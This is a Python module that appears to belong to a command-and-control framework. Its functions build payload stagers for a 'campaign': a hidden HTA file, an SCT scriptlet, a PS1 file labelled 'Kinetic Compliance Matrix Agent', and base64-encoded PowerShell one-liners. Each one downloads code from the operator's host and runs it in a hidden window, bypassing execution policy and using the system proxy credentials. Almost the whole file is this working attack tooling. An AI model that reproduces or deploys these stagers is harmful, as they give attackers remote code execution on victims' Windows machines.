# core/helpers/powershell_agents.py
import os
import base64
import json

def generate_hta_agent_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    http = "https" if ssl else "http"
    # Updated HTA agent with identity collection
    hta_content = f'''
<html>
<head>
<script language="VBScript">
    window.resizeTo 0,0
    window.moveTo -2000,-2000
    window.blur()
    
    Sub RunPowerShell
        Set objShell = CreateObject("Wscript.Shell")
        command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('{http}://{host}:{port}/raw_agent')"""
        objShell.Run command, 0, False
    End Sub
    
    RunPowerShell
    self.close
</script>
</head>
<body>
</body>
</html>
'''
    
    # Save to file
    hta_file_path = os.path.join(agents_folder, "agent.hta")
    with open(hta_file_path, "w") as f:
        f.write(hta_content)
    
    # Command to run the HTA
    if ssl:
        result = f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
    else:
        result = f"mshta http://{host}:{port}/hta_agent\npowershell -c \"mshta http://{host}:{port}/hta_agent\""
    
    with open(os.path.join(agents_folder, "hta_agent.txt"), "w") as f:
        f.write(result)
    
    return f"HTA Agent generated and saved to {os.path.join(agents_folder, 'hta_agent.txt')}\n{result}"

def generate_pwsh_job_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Updated commands to include identity collection
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{agent}\')))" -WindowStyle Hidden'
    
    raw_agent = "/raw_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{raw_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    
    JOB = commandJ.replace('{agent}', encoded)
    PROCESS = commandP.replace('{agent}', encoded)
    
    result = f"Powershell Job:\n{JOB}\nPowershell Process:\n{PROCESS}"
    with open(os.path.join(agents_folder, "powershell_job.txt"), "w") as f:
        f.write(result)
    
    return f"Powershell Job agent generated and saved to {os.path.join(agents_folder, 'powershell_job.txt')}\n{result}"

def generate_pwsh_file_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjf_agent = "/hjf_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjf_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    
    result = f"Powershell File:\n{commandF.replace('{agent}', encoded)}"
    with open(os.path.join(agents_folder, "powershell_file.txt"), "w") as f:
        f.write(result)
    
    # Create a PS1 file
    ps_file_path = os.path.join(agents_folder, "agent.ps1")
    with open(ps_file_path, "w") as f:
        f.write(f"# Kinetic Compliance Matrix Agent\n{commandF.replace('{agent}', encoded)}")
    
    return f"Powershell File agent generated and saved to {os.path.join(agents_folder, 'powershell_file.txt')}\nPS1 file saved to {ps_file_path}\n{result}"

def generate_pwsh_sct_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
    hjfs_agent = "/hjfs_agent"
    http = "https" if ssl else "http"
    agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjfs_agent}');IEX($s)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    
    # Create SCT file
    sct_content = f'''<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="TESTING"
    classid="{{F0001111-0000-0000-0000-0000FEEDACDC}}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -w hidden -c {commandF.replace('{agent}', encoded).replace('"', '\\"')}",0,false);
        ]]>
    </script>
</registration>
</scriptlet>
'''
    
    sct_file_path = os.path.join(agents_folder, "agent.sct")
    with open(sct_file_path, "w") as f:
        f.write(sct_content)
    
    result = f"Powershell SCT:\n{commandF.replace('{agent}', encoded)}"
    with open(os.path.join(agents_folder, "powershell_sct.txt"), "w") as f:
        f.write(result)
    
    return f"Powershell SCT agent generated and saved to {os.path.join(agents_folder, 'powershell_sct.txt')}\nSCT file saved to {sct_file_path}\n{result}"

def generate_pwsh_misc_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    powershell_command = f"powershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""
    result = f"Simple Powershell Agent:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    
    with open(os.path.join(agents_folder, "powershell_misc.txt"), "w") as f:
        f.write(result)
    
    return f"Simple Powershell agent generated and saved to {os.path.join(agents_folder, 'powershell_misc.txt')}\n{result}"

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    
    http = "https" if ssl else "http"
    b64_stager = "/b64_stager"
    agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    with open(os.path.join(agents_folder, "powershell_base64.txt"), "w") as f:
        f.write(result)
    
    return f"Powershell Base64 agent generated and saved to {os.path.join(agents_folder, 'powershell_base64.txt')}\n{result}"

def generate_pwsh_base52_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    
    http = "https" if ssl else "http"
    b52_stager = "/b52_stager"
    b52_agent = "/b52_agent"
    agent1 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_stager}'))\""
    agent2 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_agent}'))\""
    
    result = f"Powershell Base52:\n{agent1}\n{agent2}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    with open(os.path.join(agents_folder, "powershell_base52.txt"), "w") as f:
        f.write(result)
    
    return f"Powershell Base52 agent generated and saved to {os.path.join(agents_folder, 'powershell_base52.txt')}\n{result}"